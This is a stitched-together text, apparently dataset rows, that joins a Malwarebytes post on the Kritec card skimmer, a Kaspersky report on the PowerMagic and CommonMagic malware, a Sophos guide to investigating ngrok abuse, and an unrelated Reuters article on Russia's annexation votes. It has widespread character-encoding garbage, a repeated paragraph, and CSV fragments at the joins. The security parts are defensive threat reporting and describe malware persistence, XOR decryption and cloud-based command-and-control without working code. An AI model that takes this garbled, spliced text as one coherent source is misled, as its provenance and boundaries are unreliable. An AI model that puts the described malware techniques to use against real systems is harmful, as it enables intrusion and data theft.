 Threat actors often compete for the same resources, and this couldn't be further from the truth when it comes to website compromises. After all, if a vulnerability exists one can expect that it will be exploited more than once. In the past, we have seen such occurrences with Magecart threat actors for example in the breach of the Umbro website. Recently, while reading a blog post from security vendor Akamai, we spotted a similar situation. In the listed indicators of compromise, we noticed domains that we had seen used in a distinct skimming campaign which didn't seem to be documented yet. In fact, we saw instances of compromised stores having both skimmers loaded, which means double trouble for victims as their credit card information is stolen not just once but twice. In this blog post, we show how the newly found Kritec skimmer was found along side one of its competitors. Researchers at Akamai reported on a Magecart skimmer campaign disguised as Google Tag Manager that also made the news with the compromise of one of Canada's largest liquor store (LCBO). While details were not shared at the time, we were able to determine thanks to an archived crawl on urlscan.io that the skimmer was using WebSockets and is the same one as described in Akamai's blog.   Akamai notes that they identified multiple compromised websites that had similarities. They also list nebiltech[.]shop in their IOCs which is a domain we sometimes saw injected near the Google Tag Manager script, but not within it.  We believe this is a different campaign and threat actor altogether. Here are some reasons why: To complicate things, we observed some stores that had both skimmers at the same time, which is another reason why we believe they are not related:  We started calling this new skimmer 'Kritec' after one of its domain names. It has an interesting way of loading the malicious JavaScript we had not seen before either. The injected code calls out a first domain (seen above encoded in Base64) and generates a Base64 response:  Decoding it reveals a URL pointing to the actual skimming code, which is heavily obfuscated (likely via obfuscator.io):  The data exfiltration is also done differently as seen in the image below. On the left, the stolen credit card data is sent via a WebSocket skimmer while on the right, it is a POST request:  In the past months there have been several Magecart skimmers abusing Google Tag Manager in one way or another. We mentioned Akamai's blog but it was also documented by Recorded Future. In those instances, the malicious was actually embedded in the Google Tag Manager library itself, which is very clever and difficult to detect. While the Kritec skimmer hangs around the Google Tag Manager script, we believe it is not related to the other active campaigns. We have been documenting it recently and are reporting the abuse to Cloudflare which it uses to hide its real infrastructure. Malwarebytes customers are shielded against this campaign via our web protection in Endpoint Protection (EP), Endpoint Detection and Response (EDR) and Malwarebytes Premium.

APT reports
 21 Mar 2023 
  minute read								 Table of Contents Authors Since the start of the Russo-Ukrainian conflict, Kaspersky researchers and the international community at large have identified a significant number of cyberattacks executed in a political and geopolitical context. We previously published an overview of cyber activities and the threat landscape related to the conflict between Russia and Ukraine and continue to monitor new threats in these regions. In October 2022, we identified an active infection of government, agriculture and transportation organizations located in the Donetsk, Lugansk, and Crimea regions. Although the initial vector of compromise is unclear, the details of the next stage imply the use of spear phishing or similar methods. The victims navigated to a URL pointing to a ZIP archive hosted on a malicious web server. The archive, in turn, contained two files:  Malicious ZIP archive   Decoy Word document (subject: Results of the State Duma elections in the Republic of Crimea) In several cases, the contents of the decoy document were directly related to the name of the malicious LNK to trick the user into activating it. For example, one archive contained an LNK file named “ÐÑÐ¸ÐºÐ°Ð· ÐÐ¸Ð½ÑÐ¸Ð½Ð° ÐÐÐ  â 176.pdf.lnk” (Ministry of Finance Decree No. 176), and the decoy document explicitly referenced it by name in the text.  Decoy PDF with reference to a malicious shortcut file (subject: information about DPR Ministry of Finance Decree No. 176) The ZIP files were downloaded from various locations hosted on two domains: webservice-srv[.]online and webservice-srv1[.]online Known attachment names, redacted to remove personal information: When the potential victim activates the LNK file included in the ZIP file, it triggers a chain of events that lead to the infection of the computer with a previously unseen malicious framework that we named CommonMagic. The malware and techniques used in this campaign are not particularly sophisticated, but are effective, and the code has no direct relation to any known campaigns.  Infection chain  Installation workflow The malicious LNK points to a remotely hosted malicious MSI file that is downloaded and started by the Windows Installer executable. 
The MSI file is effectively a dropper package, containing an encrypted next-stage payload (service_pack.dat), a dropper script (runservice_pack.vbs) and a decoy document that is supposed to be displayed to the victim.  Files contained in attachment.msi The encrypted payload and the decoy document are written to the folder named %APPDATA%\WinEventCom. The VBS dropper script is, in turn, a wrapper for launching an embedded PowerShell script that decrypts the next stage using a simple one-byte XOR, launches it and deletes it from disk. Decryption of service_pack.dat   The next-stage script finalizes the installation: it opens the decoy document to display it to the user, writes two files named config and manutil.vbs to %APPDATA%\WinEventCom, and creates a Task Scheduler job named WindowsActiveXTaskTrigger, to execute theÂ wscript.exe%APPDATA%\WinEventCom\manutil.vbs command every day. The script manutil.vbs, which is dropped by the initial package, is a loader for a previously unknown backdoor written in PowerShell that we named PowerMagic. The main body of the backdoor is read from the file %APPDATA%\WinEventCom\config and decrypted with a simple XOR (key: 0x10). Snippet of PowerMagic’s code containing the “powermagic” string 
When started, the backdoor creates a mutex – WinEventCom. Then, it enters an infinite loop communicating with its C&C server, receiving commands and uploading results in response. It uses OneDrive and Dropbox folders as transport, and OAuth refresh tokens as credentials.
Every minute the backdoor performs the following actions:

Modifies the heartbeat file located at /$AppDir/$ClientDir/<machine UID> (the values of the $AppDir and $ClientDir PowerShell variables may differ between samples). The contents of this file consist of the backdoor PID and a number incremented by one with each file modification.
Downloads commands that are stored as a file in the /$AppDir/$ClientTaskDir directory.
Executes every command as a PowerShell script.
Uploads the output of the executed PowerShell command to the cloud storage, placing it in the /$AppDir/$ClientResultDir/<victim machine UUID>.<timestamp> file.

The CommonMagic framework
As it turned out, PowerMagic was not the only malicious toolkit used by the actor. All the victims of PowerMagic were also infected with a more complicated, previously unseen, modular malicious framework that we named CommonMagic. This framework was deployed after initial infection with the PowerShell backdoor, leading us to believe that CommonMagic is deployed via PowerMagic.
The CommonMagic framework consists of several executable modules, all stored in the directory C:\ProgramData\CommonCommand. Modules start as standalone executable files and communicate via named pipes. There are dedicated modules for interaction with the C&C server, encryption and decryption of the C&C traffic and various malicious actions.
The diagram below illustrates the architecture of the framework.

Framework architecture
Network communication
The framework uses OneDrive remote folders as a transport. It utilizes the Microsoft Graph API using an OAuth refresh token embedded into the module binary for authentication. The RapidJSON library is used for parsing JSON objects returned by the Graph API.
A dedicated heartbeat thread updates the remote file <victim ID>/S/S.txt every five minutes with the local timestamp of the victim.
Then, in separate threads, the network communication module downloads new executable modules from the directory <victim ID>/M and uploads the results of their execution to the directory <victim ID>/R.
The data exchanged with the operator via the OneDrive location is encrypted using the RC5Simple open-source library. By default, this library uses the seven-byte sequence “RC5SIMP” at the beginning of the encrypted sequence, but the developers of the backdoor changed it to “Hwo7X8p”. Encryption is implemented in a separate process, communicating over the pipes named \\.\pipe\PipeMd and \\.\pipe\PipeCrDtMd.
Plugins
So far, we have discovered two plugins implementing the malicious business logic. They are located in the directory C:\ProgramData\CommonCommand\Other.

Screenshot (S.exe) – takes screenshots every three seconds using the GDI API
USB (U.exe) â collects the contents of the files with the following extensions from connected USB devices: .doc, .docx. .xls, .xlsx, .rtf, .odt, .ods, .zip, .rar, .txt, .pdf.

To be continued
So far, we have found no direct links between the samples and data used in this campaign and any previously known actors. However, the campaign is still active, and our investigation continues. So, we believe that further discoveries may reveal additional information about this malware and the threat actor behind it.

So far, we have found no direct links between the samples and data used in this campaign and any previously known actors. However, the campaign is still active, and our investigation continues. So, we believe that further discoveries may reveal additional information about this malware and the threat actor behind it. Lure archives

Malwarebytes Threat Intelligence - May 2023 3,https://news.sophos.com/en-us/2022/07/14/rapid-response-the-ngrok-incident-guide/,"This article is part of a series of step-by-step incident guides created by the Sophos Rapid Response team to help incident responders and security-operations teams identify and remediate widely seen threat tools, techniques, and behaviors. What Is Ngrok and How Is It Used by Threat Actors?Â  Ngrok is a cross-platform tool that exposes local network ports to the internet via secure tunneling.Â  It provides secure tunnels between the internet and computer systems that exist behind a firewall or Network Access Translation (NAT) solution, and which use the Transmission Control Protocol (TCP). Once a port has been chosen as the desired communication channel, the necessary tunneling configurations are set up within the ngrok process. Ngrokâs cloud services facilitate two-way network traffic that is relayed back to the running ngrok process and forwards the network traffic to the specified local port.Â  A limited version of the tool is freely available at ngrok.com for noncommercial use, and a fuller-fledged versionÂ can be licensed for commercial use. Unfortunately, it also figures into various attack strategies when malicious actors use its tunneling capabilities to connect to command-and-control (C2) servers, download malicious code, and so forth while bypassing network protections.Â  Other likely reasons for its popularity with attackers include:Â Â Â  Incident Guide ContextÂ  This guide only addresses the investigation and mitigation of incidents involving the detection of ngrok on the network. We strongly recommend that responders ascertain whether ngrok is in use on their network for legitimate purposes before proceeding with mitigation.Â  The guide uses features ofâ¯Sophos XDR, such as Live Discover and Live Response, to illustrate the steps defenders can take. Security professionals that are not using Sophos XDR but have access to other tools such asâ¯OSQueryâ¯can adapt and apply the information to their needs.Â  Queries and commands referenced in the guide are some of the methods used by theâ¯Sophos Rapid Responseâ¯team during incident engagements. They are recommendations only; there will be other ways of accomplishing each task.Â  Any instructions to remove items should be double-checked to prevent the accidental removal of legitimate client configurations.Â  The goal of this section is to establish if there are any Indicators of Compromise (IOC) on the affected system that are related to ngrok. In subsequent sections we will provide steps to analyze and respond to the results of investigation. For purposes of illustration, we will draw on two separate response scenarios in these sections. We will occasionally use green text to draw attention to significant details.Â  Check for Live ProcessesÂ  First, run a query on the network to check the currently running processes.Â Â  Sophos XDR customers can create and run new Live Discover queries to do this. If you are new to Live Discover, the help guide can assist you in putting those together. The basic steps are as follows:Â  In our example, we ran some queries on DNS, HTTP, and PowerShell checking for any signs of ngrok. These are presented here along with the findings. Moving on, we start to dig deeper in DNS, Journals, and other logged data. These options are presented here along with the findings. The following information is based on intelligence gathered during two incident response investigations in which ngrok was introduced to the targeted network and abused by attackers. Incident One Incident Two Here, ngrok artifacts (based on ngrok TCP 3389 binding and payload retrieval via web protocols) were found. These are listed below along with their location. Values shown in green represent data that could be used to suggest ngrok presence / activity. Now that we have information derived from investigation and analysis, we can respond to an unwanted instance of ngrok and clean up the network/endpoints, using Sophos Central (or other installed security solution and policies) to block the application. There are various ways to accomplish this. Sophos Central has a global block list by hash (although only versions of ngrok that have hashes added would be blocked). Microsoft AppLocker policies / rule sets concerning unsigned binaries can also be put in place to counter this, since the ngrok binary is currently not digitally signed. Mitigation can also be handled at the proxy servers or firewalls (if reviewing DNS requests / TLS decryption packet inspection). Although ngrok binaries can differ in name, hash, location, and so forth, the initial network communications to use ngrokâs public infrastructure appear to be static. For example: Likewise, for DNS requests, a similar approach could be adopted to block ngrok traffic and identify which machines were initiating the DNS requests. Note that as shown in various instances above, ngrok uses multiple top-level domains (.com, .io): Before restoring from backup, remember to check that your backups are also clean.

Malwarebytes Threat Intelligence - May 2023 3,https://www.reuters.com/world/ukraine-annexation-votes-end-amid-russian-mobilisation-exodus-2022-09-26/,"ZAPORIZHZHIA, Ukraine, Sept 28 (Reuters) - Moscow was poised on Wednesday to annex a swath of Ukraine, releasing what it called vote tallies showing support in four partially occupied provinces to join Russia, after what Kyiv and the West denounced as illegal sham referendums held at gunpoint. On Moscow's Red Square, a tribune with giant video screens has been set up, with billboards proclaiming ""Donetsk, Luhansk, Zaporizhzhia, Kherson - Russia!"" President Vladimir Putin could proclaim the annexation in a speech within days, just over a week since he endorsed the referendums, ordered a military mobilisation at home and threatened to defend Russia with nuclear weapons if necessary. The Russian-installed administrations of the four Ukrainian provinces on Wednesday formally asked Putin to incorporate them into Russia, which Russian officials have suggested is a formality. ""The results are clear. Welcome home, to Russia!,"" Dmitry Medvedev, a former president who serves as deputy chairman of Russia's Security Council, said on Telegram. Russian-backed authorities claim to have carried out the referendums over five days in parts of eastern and southern Ukraine that makes up around 15% of the country's territory. Residents who escaped to Ukrainian-held areas in recent days have told of people being forced to mark ballots in the street by roving officials at gunpoint. Footage filmed during the exercise showed Russian-installed officials taking ballot boxes from house to house with armed men in tow. ""They can announce anything they want. Nobody voted in the referendum except a few people who switched sides. They went from house to house but nobody came out,"" said Lyubomir Boyko, 43, from Golo Pristan, a village in Russian-occupied Kherson province. Russia says voting was voluntary, in line with international law, and that turnout was high. The referendums and notion of annexations has been rejected globally, as was Russia's 2014 takeover of Crimea from Ukraine. Ukrainian President Volodymyr Zelenskiy sought to rally international support against possible Russian annexations in a series of calls with foreign leaders, including those of Britain, Canada, Germany and Turkey. ""Thank you all for your clear and unequivocal support. Thank you all for understanding our position,"" Zelenskiy said in a late-night video address. The United States said it would in coming days impose economic costs on Moscow for the referendums, adding to several tranches of sanctions since Russia's invasion of Ukraine in February that has destroyed cities and killed thousands. ""We will continue to work with allies and partners to bring even more pressure on Russia and the individuals and entities that are helping support its attempted land grab,"" State Department spokesperson Ned Price told reporters. The European Union's executive also proposed more sanctions against Russia, but the bloc's 27 member countries will need to overcome their own differences to implement them. [1/7]A Russian serviceman addresses reservists at a gathering point in the course of partial mobilization of troops, aimed to support the country's military campaign in Ukraine, in the town of Volzhsky in the Volgograd region, Russia September 28, 2022. REUTERS/Stringer Denis Pushilin, the Russian-installed leader in Donetsk province, said he was on his way to Moscow to complete the legal process of joining Russia. ""Now we are moving to a new stage of military action,"" he said, amid speculation that Putin is set to change the status of what he has so far called a ""special military operation"" to a counter-terrorism operation. Russian officials have said any attack on annexed territory would be an attack on Russia itself. Putin altered his strategy following a stunning setback for Russian forces in the northeastern region of Kharkiv earlier in September, when Ukrainian troops recaptured dozens of towns and villages. He also announced the swift call-up of hundreds of thousands of Russian men to fight, and issued a new warning about the possible use of nuclear weapons. Kremlin spokesman Dmitry Peskov said Russia would need to keep fighting until it had taken control of all of Donetsk. Around 40% is still under Ukrainian control and the scene of some of the war's heaviest fighting. The general staff of the Ukrainian armed forces said 11 Russian attacks had been repelled on Wednesday, most of them north of Donetsk. Russian forces had shelled dozens of towns along the length of the front line, it said in a Facebook post. Reuters was not able to verify battlefield reports. The Russian annexation plan gathered pace as leaking gas bubbled up in the Baltic Sea for a third day after suspected explosions tore through undersea pipelines built by Russia and European partners. The Nord Stream 1 pipeline, once the main route for Russian gas to Germany, was already shut but cannot now be easily reopened. NATO and the European Union warned of the need to protect critical infrastructure from what they called ""sabotage"", though officials stopped short of assigning blame. Russia's FSB security service is investigating the damage sustained to the pipelines as ""international terrorism"", the Interfax news agency cited the general prosecutor's office as saying. The Nord Stream pipelines have been flashpoints in an expanding energy war between Moscow and capitals in Europe that has damaged major Western economies and sent gas prices soaring. The United States believes it is too soon to conclude there was sabotage, a senior U.S. military official told reporters in Washington on Wednesday. ""The jury is still out,"" the official said. Meanwhile, the United States unveiled a $1.1 billion weapons package for Ukraine that includes 18 High Mobility Artillery Rocket System (HIMARS) launchers, accompanying munitions, various types of counter drone systems and radar systems. The announcement brings the U.S. security aid to $16.2 billion. Our Standards: The Thomson Reuters Trust Principles.
